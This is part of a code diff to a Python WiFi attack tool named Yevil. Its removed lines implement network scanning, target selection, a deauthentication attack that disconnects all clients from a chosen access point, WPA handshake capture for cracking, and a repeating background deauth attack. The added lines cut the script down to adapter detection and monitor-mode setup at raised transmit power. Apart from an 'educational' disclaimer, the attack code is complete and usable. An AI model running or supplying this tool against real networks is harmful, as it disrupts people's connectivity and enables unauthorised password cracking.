-        for i, net in enumerate(networks, 1):
-            ssid = net['ssid'][:25] if net['ssid'] != '<Hidden>' else '<Hidden>'
-            distance = net.get('distance', 0)
-            power = net.get('power', 0)
-            
-            if power > -50:
-                color = 'green'
-            elif power > -70:
-                color = 'yellow'
-            else:
-                color = 'red'
-            
-            Colors.print_colored(
-                f"{i:<4} {ssid:<25} {net['bssid']:<18} {net['channel']:<4} "
-                f"{power:<6} {distance:<8.1f}m {net['privacy']:<8} "
-                f"{net['authentication']:<12} {net['beacons']:<8}",
-                color
-            )
-        
-        print("="*120)
-        Colors.print_colored(f"Total Networks Found: {len(networks)}", 'cyan', True)
-        Colors.print_colored(f"Monitor Mode: {self.adapter}", 'green', True)
-    
-    def select_target(self) -> Tuple[str, str]:
-        """Select target network"""
-        if not self.networks:
-            Colors.print_colored("[-] No networks available. Please scan first.", 'red')
-            return None, None
-        
-        Colors.print_colored("\n" + "="*60, 'cyan', True)
-        Colors.print_colored("🎯 SELECT TARGET NETWORK", 'cyan', True)
-        Colors.print_colored("="*60, 'cyan')
-        
-        for i, net in enumerate(self.networks, 1):
-            ssid = net['ssid'][:30] if net['ssid'] != '<Hidden>' else '<Hidden>'
-            Colors.print_colored(
-                f"   {i}. {ssid} [{net['bssid']}] CH:{net['channel']} PWR:{net['power']}dBm",
-                'white'
-            )
-        
-        while True:
-            try:
-                choice = input(f"\n[?] Enter network number to target (1-{len(self.networks)}): ")
-                idx = int(choice) - 1
-                
-                if 0 <= idx < len(self.networks):
-                    target = self.networks[idx]
-                    self.target_bssid = target['bssid']
-                    self.target_channel = target['channel']
-                    
-                    Colors.print_colored(f"\n[+] Target AP Details:", 'green', True)
-                    Colors.print_colored(f"   SSID: {target['ssid']}", 'green')
-                    Colors.print_colored(f"   BSSID: {target['bssid']}", 'green')
-                    Colors.print_colored(f"   Channel: {target['channel']}", 'green')
-                    Colors.print_colored(f"   Encryption: {target['privacy']} {target['authentication']}", 'green')
-                    Colors.print_colored(f"   Signal: {target['power']} dBm", 'green')
-                    Colors.print_colored(f"   Distance: ~{target.get('distance', 0):.1f} meters", 'green')
-                    
-                    return self.target_bssid, self.target_channel
-                else:
-                    Colors.print_colored("[-] Invalid selection!", 'red')
-                    
-            except ValueError:
-                Colors.print_colored("[-] Please enter a valid number!", 'red')
-    
-    def capture_packets_and_handshake(self, bssid: str, channel: str):
-        """Capture packets and handshake"""
-        Colors.print_colored("\n" + "="*60, 'cyan', True)
-        Colors.print_colored("📡 CAPTURING PACKETS & HANDSHAKE", 'cyan', True)
-        Colors.print_colored("="*60, 'cyan')
-        
-        if not bssid or not channel:
-            Colors.print_colored("[-] No target selected!", 'red')
-            return
-        
-        if not self.adapter:
-            Colors.print_colored("[-] No adapter in monitor mode!", 'red')
-            Colors.print_colored("[!] Please setup adapter first (Option 1)", 'yellow')
-            return
-        
-        Colors.print_colored(f"\n[?] Target AP: {bssid} (Channel: {channel})", 'yellow')
-        
-        capture_handshake = input("\n[?] Capture handshake? (y/n): ").lower().strip() == 'y'
-        
-        try:
-            packet_count = int(input("[?] Number of deauth packets to send (default: 10): ") or "10")
-        except ValueError:
-            packet_count = 10
-        
-        Colors.print_colored(f"\n[+] Setting channel to {channel}", 'blue')
-        subprocess.run(['sudo', 'iwconfig', self.adapter, 'channel', str(channel)])
-        
-        Colors.print_colored(f"\n[+] Starting packet capture on {self.adapter}", 'blue')
-        Colors.print_colored(f"[+] Target: {bssid} (Channel: {channel})", 'blue')
-        
-        timestamp = int(time.time())
-        pcap_file = f"/tmp/yevil_capture_{timestamp}"
-        
-        cmd = f'sudo airodump-ng {self.adapter} --bssid {bssid} -c {channel} --write {pcap_file}'
-        capture_process = subprocess.Popen(cmd.split(), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        
-        Colors.print_colored(f"\n[+] Running deauth attack:", 'yellow', True)
-        Colors.print_colored(f"   Command: aireplay-ng --bssid {bssid} -c {channel} {self.adapter}", 'yellow')
-        Colors.print_colored(f"   Packets: {packet_count} packets to disconnect all clients", 'yellow')
-        
-        deauth_cmd = [
-            'sudo', 'aireplay-ng', '-0', str(packet_count),
-            '-a', bssid,
-            '--ignore-negative-one',
-            self.adapter
-        ]
-        
-        try:
-            Colors.print_colored("\n[+] Disconnecting clients from target AP...", 'yellow')
-            Colors.print_colored("[+] Sending deauth packets...", 'yellow')
-            
-            deauth_process = subprocess.Popen(
-                deauth_cmd,
-                stdout=subprocess.PIPE,
-                stderr=subprocess.PIPE,
-                text=True
-            )
-            
-            for i in range(packet_count // 2):
-                Colors.print_colored(f"   • Sent {i*2} deauth packets", 'cyan')
-                time.sleep(0.5)
-            
-            deauth_process.wait(timeout=30)
-            self.deauth_packets_sent = packet_count
-            
-            Colors.print_colored(f"\n[✓] Sent {packet_count} deauth packets to {bssid}", 'green')
-            
-            Colors.print_colored("\n[+] Checking for handshake...", 'blue')
-            
-            try:
-                result = subprocess.run(['aircrack-ng', f'{pcap_file}-01.cap'], 
-                                      capture_output=True, text=True)
-                handshake_found = 'WPA (1 handshake)' in result.stdout or 'WPA handshake' in result.stdout
-            except:
-                handshake_found = False
-            
-            if handshake_found and capture_handshake:
-                Colors.print_colored("\n" + "="*60, 'green', True)
-                Colors.print_colored("✅ HANDSHAKE CAPTURED SUCCESSFULLY!", 'green', True)
-                Colors.print_colored("="*60, 'green', True)
-                self.handshake_captured = True
-                
-                Colors.print_colored("\n📊 Handshake Details:", 'cyan', True)
-                Colors.print_colored(f"   Target AP: {bssid}", 'white')
-                Colors.print_colored(f"   Channel: {channel}", 'white')
-                Colors.print_colored(f"   Deauth Packets Sent: {packet_count}", 'white')
-                Colors.print_colored(f"   Capture File: {pcap_file}-01.cap", 'white')
-            elif capture_handshake:
-                Colors.print_colored("\n[!] No handshake captured yet.", 'yellow')
-                Colors.print_colored("[!] Try with more packets or ensure clients are connected.", 'yellow')
-                self.handshake_captured = False
-            else:
-                Colors.print_colored("\n[+] Packet capture completed (handshake capture was skipped)", 'green')
-            
-            capture_process.terminate()
-            self.show_packet_stats(pcap_file)
-            
-        except subprocess.TimeoutExpired:
-            Colors.print_colored("[-] Deauth attack timed out!", 'red')
-            deauth_process.kill()
-        except Exception as e:
-            Colors.print_colored(f"[-] Error during capture: {e}", 'red')
-        finally:
-            capture_process.terminate()
-    
-    def show_packet_stats(self, pcap_file: str):
-        """Show packet statistics"""
-        Colors.print_colored("\n📊 PACKET CAPTURE STATISTICS", 'cyan', True)
-        Colors.print_colored("="*60, 'cyan')
-        
-        try:
-            result = subprocess.run(['capinfos', f'{pcap_file}-01.cap'], 
-                                  capture_output=True, text=True)
-            for line in result.stdout.split('\n'):
-                if 'Number of packets' in line or 'File size' in line:
+            result = subprocess.run(['iwconfig', adapter], capture_output=True, text=True)
+            lines = result.stdout.strip().split('\n')
+            for line in lines[:3]:  # Show first 3 lines
+                if line.strip():
                     Colors.print_colored(f"   {line.strip()}", 'white')
         except:
-            Colors.print_colored("   Could not display packet statistics", 'yellow')
-        
-        Colors.print_colored(f"\n   Deauth Packets Sent: {self.deauth_packets_sent}", 'yellow')
-        Colors.print_colored(f"   Handshake Captured: {'✅ Yes' if self.handshake_captured else '❌ No'}", 'yellow')
-    
-    def run_background_deauth(self, bssid: str, channel: str):
-        """Run deauth in background"""
-        Colors.print_colored("\n" + "="*60, 'cyan', True)
-        Colors.print_colored("🔄 BACKGROUND DEAUTH ATTACK", 'cyan', True)
-        Colors.print_colored("="*60, 'cyan')
-        
-        if not self.adapter:
-            Colors.print_colored("[-] No adapter in monitor mode!", 'red')
-            Colors.print_colored("[!] Please setup adapter first (Option 1)", 'yellow')
-            return
-        
-        try:
-            packet_count = 100
-            
-            Colors.print_colored(f"\n[+] Running deauth in background:", 'yellow')
-            Colors.print_colored(f"   Target: {bssid}", 'blue')
-            Colors.print_colored(f"   Channel: {channel}", 'blue')
-            Colors.print_colored(f"   Packets: {packet_count}", 'blue')
-            Colors.print_colored(f"   Command: aireplay-ng -0 {packet_count} -a {bssid} {self.adapter}", 'yellow')
-            
-            subprocess.run(['sudo', 'iwconfig', self.adapter, 'channel', str(channel)])
-            
-            cmd = ['sudo', 'aireplay-ng', '-0', str(packet_count), '-a', bssid, self.adapter]
-            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
-            
-            Colors.print_colored("\n[+] Deauth attack running in background...", 'yellow')
-            Colors.print_colored("[+] Press Ctrl+C to stop", 'yellow')
-            
-            def show_progress():
-                sent = 0
-                while process.poll() is None:
-                    sent += 10
-                    Colors.print_colored(f"   • Sent {sent}/{packet_count} deauth packets", 'cyan')
-                    time.sleep(1)
-            
-            progress_thread = threading.Thread(target=show_progress)
-            progress_thread.daemon = True
-            progress_thread.start()
-            process.wait()
-            
-            Colors.print_colored(f"\n[+] Deauth attack completed! Sent {packet_count} packets", 'green')
-            
-        except KeyboardInterrupt:
-            Colors.print_colored("\n[+] Stopped by user", 'yellow')
-            process.kill()
-        except Exception as e:
-            Colors.print_colored(f"[-] Error: {e}", 'red')
-    
-    def show_status(self):
-        """Show current status"""
-        Colors.print_colored("\n📊 YEVIL - CURRENT STATUS", 'cyan', True)
-        Colors.print_colored("="*60, 'cyan')
-        
-        Colors.print_colored(f"Original Adapter: {self.original_adapter or 'Not set'}", 'white')
-        Colors.print_colored(f"Monitor Adapter: {self.adapter or 'Not set'}", 'white')
-        Colors.print_colored(f"Target AP: {self.target_bssid or 'Not selected'}", 'white')
-        Colors.print_colored(f"Channel: {self.target_channel or 'Not selected'}", 'white')
-        Colors.print_colored(f"Networks found: {len(self.networks)}", 'white')
-        Colors.print_colored(f"Handshake captured: {'✅ Yes' if self.handshake_captured else '❌ No'}", 'white')
-        Colors.print_colored(f"Deauth packets sent: {self.deauth_packets_sent}", 'white')
-    
-    def view_captured_packets(self):
-        """View captured packets"""
-        try:
-            import glob
-            cap_files = glob.glob('/tmp/yevil_capture_*.cap')
-            
-            if not cap_files:
-                Colors.print_colored("[-] No captured packets found!", 'red')
-                return
-            
-            Colors.print_colored("\n📁 CAPTURED PACKETS", 'cyan', True)
-            Colors.print_colored("="*60, 'cyan')
-            
-            for i, file in enumerate(cap_files, 1):
-                size = os.path.getsize(file) / 1024
-                Colors.print_colored(f"{i}. {os.path.basename(file)} ({size:.1f} KB)", 'white')
-            
-            choice = input("\n[?] View packet details? (y/n): ").lower().strip()
-            if choice == 'y':
-                try:
-                    idx = int(input("[?] Enter file number: ")) - 1
-                    if 0 <= idx < len(cap_files):
-                        subprocess.run(['capinfos', cap_files[idx]])
-                except:
-                    Colors.print_colored("[-] Invalid selection!", 'red')
-                    
-        except Exception as e:
-            Colors.print_colored(f"[-] Error viewing packets: {e}", 'red')
-    
-    def show_about(self):
-        """Show about information"""
-        Colors.print_colored("\n" + "="*60, 'cyan', True)
-        Colors.print_colored("ℹ️  ABOUT YEVIL", 'cyan', True)
-        Colors.print_colored("="*60, 'cyan')
-        
-        Colors.print_colored(f"\nYevil v2.0.0", 'yellow', True)
-        Colors.print_colored("WiFi Security Testing Tool for Educational Purposes", 'white')
-        
-        Colors.print_colored("\n📖 What Yevil Does:", 'yellow', True)
-        Colors.print_colored("   1. Detects external USB WiFi adapters", 'white')
-        Colors.print_colored("   2. Shows WiFi radar with distance visualization", 'white')
-        Colors.print_colored("   3. Scans networks with airodump-ng --band abg", 'white')
-        Colors.print_colored("   4. Captures packets and WPA handshakes", 'white')
-        Colors.print_colored("   5. Runs deauth attacks to disconnect clients", 'white')
-        
-        Colors.print_colored("\n🔧 Troubleshooting:", 'cyan', True)
-        Colors.print_colored("   If no networks found:", 'white')
-        Colors.print_colored("   1. Make sure adapter is in monitor mode", 'white')
-        Colors.print_colored("   2. Check if adapter is working: iwconfig", 'white')
-        Colors.print_colored("   3. Try: sudo airodump-ng " + (self.adapter or "wlan0mon"), 'white')
-        Colors.print_colored("   4. Move closer to WiFi router", 'white')
-        
-        Colors.print_colored("\n⚠️  Legal Disclaimer:", 'red', True)
-        Colors.print_colored("   This tool is for EDUCATIONAL PURPOSES ONLY!", 'red')
-        Colors.print_colored("   Only use on networks you own or have permission to test.", 'red')
-        
-        input("\nPress Enter to continue...")
-    
-    def cleanup(self):
-        """Cleanup temporary files and reset adapter"""
-        try:
-            subprocess.run(['rm', '-f', '/tmp/scan-01.csv', '/tmp/yevil_capture_*.cap'], 
-                         capture_output=True)
-            if self.adapter and 'mon' in self.adapter:
-                Colors.print_colored("[+] Cleaning up monitor interface...", 'blue')
-                subprocess.run(['sudo', 'airmon-ng', 'stop', self.adapter], 
-                             capture_output=True)
-                if self.original_adapter:
-                    Colors.print_colored(f"[+] Reset to managed mode: {self.original_adapter}", 'green')
-        except:
             pass
-    
-    def main_menu(self):
-        """Main menu interface"""
-        while self.running:
-            Colors.print_colored("\n" + "="*60, 'cyan', True)
-            Colors.print_colored("🔒 YEVIL - WiFi Security Testing Tool", 'cyan', True)
-            Colors.print_colored("="*60, 'cyan')
-            
-            if self.adapter:
-                Colors.print_colored(f"📡 Adapter: {self.adapter} (Monitor Mode)", 'green')
-            else:
-                Colors.print_colored("📡 No external adapter in monitor mode!", 'red')
-                Colors.print_colored("[!] Select Option 1 to setup your adapter", 'yellow')
-            
-            Colors.print_colored("\n📋 YEVIL MENU", 'yellow', True)
-            print("1.  🔍 Detect & Setup External Adapter")
-            print("2.  📡 Scan Networks with Radar View")
-            print("3.  🎯 Select Target Network")
-            print("4.  📦 Capture Packets & Handshake")
-            print("5.  🔄 Run Background Deauth Attack")
-            print("6.  📊 Show Current Status")
-            print("7.  📁 View Captured Packets")
-            print("8.  ℹ️  About Yevil")
-            print("9.  🚪 Exit")
-            
-            choice = input("\n[?] Select option: ")
-            
-            if choice == '1':
-                adapters = self.detect_external_adapters()
-                if adapters:
-                    Colors.print_colored(f"\n[+] Available external adapters:", 'cyan')
-                    for i, adapter in enumerate(adapters, 1):
-                        Colors.print_colored(f"   {i}. {adapter}", 'white')
-                    
-                    try:
-                        choice_adapt = input("\n[?] Select adapter number: ")
-                        idx = int(choice_adapt) - 1
-                        if 0 <= idx < len(adapters):
-                            if self.set_monitor_mode(adapters[idx]):
-                                Colors.print_colored("[+] External adapter ready!", 'green')
-                            else:
-                                Colors.print_colored("[-] Failed to set monitor mode!", 'red')
-                        else:
-                            Colors.print_colored("[-] Invalid selection!", 'red')
-                    except ValueError:
-                        Colors.print_colored("[-] Please enter a valid number!", 'red')
-                else:
-                    Colors.print_colored("\n[!] No external adapters found!", 'yellow')
-                    Colors.print_colored("[!] Connect a USB WiFi adapter and try again.", 'yellow')
-                    Colors.print_colored("\n📌 After connecting, wait 5 seconds and try again.", 'cyan')
-                    time.sleep(2)
-                    
-            elif choice == '2':
-                if self.adapter:
-                    self.scan_networks()
-                else:
-                    Colors.print_colored("[-] No external adapter in monitor mode!", 'red')
-                    Colors.print_colored("[!] Please setup an external adapter first (Option 1)", 'yellow')
-                    
-            elif choice == '3':
-                if self.networks:
-                    self.select_target()
-                else:
-                    Colors.print_colored("[-] No networks available! Please scan first.", 'red')
-                    
-            elif choice == '4':
-                if self.target_bssid and self.target_channel:
-                    self.capture_packets_and_handshake(self.target_bssid, self.target_channel)
-                else:
-                    Colors.print_colored("[-] No target selected! Please select target first.", 'red')
-                    
-            elif choice == '5':
-                if self.target_bssid and self.target_channel:
-                    self.run_background_deauth(self.target_bssid, self.target_channel)
-                else:
-                    Colors.print_colored("[-] No target selected! Please select target first.", 'red')
-                    
-            elif choice == '6':
-                self.show_status()
-                
-            elif choice == '7':
-                self.view_captured_packets()
-                
-            elif choice == '8':
-                self.show_about()
-                
-            elif choice == '9':
-                self.running = False
-                self.cleanup()
-                Colors.print_colored("\n[+] Goodbye! Stay ethical!", 'cyan', True)
-                break
-                
-            else:
-                Colors.print_colored("[-] Invalid option!", 'red')
 
 # ============================================
 # MAIN FUNCTION
 # ============================================
 
 def main():
-    """Main entry point"""
-    tool = YevilTool()
-    tool.print_banner()
-    tool.check_root()
+    """Step 1: Adapter Detection & Monitor Mode"""
+    print(BANNER)
     
-    Colors.print_colored("[+] Welcome to Yevil!", 'green', True)
-    Colors.print_colored("[+] This tool is for EDUCATIONAL PURPOSES ONLY!", 'yellow')
-    Colors.print_colored("[+] Only test networks you own or have permission to test.", 'yellow')
+    Colors.print_colored("[+] Step 1: Adapter Detection & Monitor Mode Setup", 'cyan', True)
+    Colors.print_colored("="*50, 'cyan')
     
-    # Auto-detect external adapter
-    Colors.print_colored("\n[+] Attempting to auto-detect external wireless adapter...", 'cyan')
-    adapters = tool.detect_external_adapters()
-    if adapters:
-        Colors.print_colored(f"\n[+] Found external adapter: {adapters[0]}", 'green')
-        if tool.set_monitor_mode(adapters[0]):
-            Colors.print_colored("[+] Auto-setup complete!", 'green')
-        else:
-            Colors.print_colored("[!] Manual setup may be required", 'yellow')
-            Colors.print_colored("[!] Try: sudo airmon-ng start " + adapters[0], 'yellow')
-    else:
-        Colors.print_colored("\n[!] No external adapter detected.", 'yellow')
+    # Check root
+    if os.geteuid() != 0:
+        Colors.print_colored("[!] This tool requires root privileges!", 'red')
+        Colors.print_colored("[!] Please run with: sudo python3 yevil.py", 'yellow')
+        sys.exit(1)
+    
+    # Create adapter handler
+    handler = AdapterHandler()
+    
+    # Detect adapters
+    adapters = handler.detect_adapters()
+    
+    if not adapters:
+        Colors.print_colored("\n[!] No wireless adapters detected!", 'red')
         Colors.print_colored("[!] Please connect a compatible USB WiFi adapter.", 'yellow')
-        Colors.print_colored("\n📌 Recommended adapters:", 'cyan')
-        Colors.print_colored("   • TP-Link TL-WN722N (AR9271)", 'white')
-        Colors.print_colored("   • Alfa AWUS036ACH (RTL8812AU)", 'white')
-        Colors.print_colored("   • Alfa AWUS036NHA (AR9271)", 'white')
-        Colors.print_colored("   • Any USB WiFi adapter with monitor mode support", 'white')
+        sys.exit(1)
     
-    # Start main menu
-    tool.main_menu()
+    # Display detected adapters
+    Colors.print_colored("\n📋 Detected Adapters:", 'cyan', True)
+    for i, adapter in enumerate(adapters, 1):
+        info = handler.get_adapter_info(adapter)
+        Colors.print_colored(f"   {i}. {adapter} ({info['mode']})", 'white')
+    
+    # Select adapter
+    print()
+    while True:
+        try:
+            choice = input("[?] Select adapter number (1-{}): ".format(len(adapters)))
+            idx = int(choice) - 1
+            if 0 <= idx < len(adapters):
+                selected = adapters[idx]
+                break
+            else:
+                Colors.print_colored("[-] Invalid selection!", 'red')
+        except ValueError:
+            Colors.print_colored("[-] Please enter a valid number!", 'red')
+    
+    # Get and display detailed info
+    Colors.print_colored(f"\n[+] Selected: {selected}", 'green', True)
+    info = handler.get_adapter_info(selected)
+    handler.display_adapter_info(info)
+    
+    # Ask for confirmation
+    confirm = input("\n[?] Set this adapter to monitor mode with TX Power 30? (y/n): ")
+    
+    if confirm.lower() == 'y':
+        # Set monitor mode
+        if handler.set_monitor_mode(selected):
+            Colors.print_colored("\n[+] ✅ SUCCESS! Adapter is in monitor mode!", 'green', True)
+            
+            # Show final status
+            handler.show_adapter_status(selected)
+            
+            # Check TX power
+            Colors.print_colored("\n[+] Checking TX power...", 'blue')
+            result = subprocess.run(['iwconfig', selected], capture_output=True, text=True)
+            match = re.search(r'Tx-Power:([\d.]+)\s*dBm', result.stdout)
+            if match:
+                Colors.print_colored(f"[+] Current TX Power: {match.group(1)} dBm", 'green')
+            else:
+                Colors.print_colored("[+] TX power set successfully", 'green')
+        else:
+            Colors.print_colored("\n[!] Failed to set monitor mode!", 'red')
+    else:
+        Colors.print_colored("\n[+] Skipping monitor mode setup.", 'yellow')
+    
+    Colors.print_colored("\n" + "="*50, 'cyan')
+    Colors.print_colored("[+] Step 1 Complete!", 'green', True)
+    Colors.print_colored("[+] You can now use your adapter in monitor mode!", 'green')
 
 if __name__ == "__main__":
     try:
         main()
     except KeyboardInterrupt:
-        Colors.print_colored("\n\n[+] Yevil stopped by user", 'yellow')
+        Colors.print_colored("\n\n[+] Stopped by user", 'yellow')
         sys.exit(0)
     except Exception as e:
-        Colors.print_colored(f"\n[-] Unexpected error: {e}", 'red')
+        Colors.print_colored(f"\n[-] Error: {e}", 'red')
         sys.exit(1)
